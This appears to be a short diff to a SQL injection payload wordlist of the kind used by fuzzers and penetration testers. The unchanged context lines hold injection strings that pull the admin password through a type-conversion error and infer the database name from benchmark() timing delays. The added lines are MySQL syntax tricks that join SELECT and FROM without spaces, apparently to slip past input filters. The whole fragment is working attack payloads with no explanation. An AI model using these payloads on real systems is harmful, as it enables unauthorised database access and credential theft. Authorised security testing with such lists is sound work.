@@ -183,3 +183,8 @@ admin' and 1=convert(int,(select password from users where username='admin'))--
 ' and (select 1 from (select benchmark(10000000,sha1(1)))a where substring(database(),1,1)='s')--
 ' and (select 1 from (select benchmark(10000000,md5(1)))a where substring(database(),1,1)='s')--
 ' and (select 1 from (select benchmark(10000000,encode('test','test')))a where substring(database(),1,1)='s')--
+SELECT-1e1FROM`test`
+SELECT~1.FROM`test`
+SELECT\NFROM`test`
+SELECT@^1.FROM`test`
+SELECT-id-1.FROM`test`
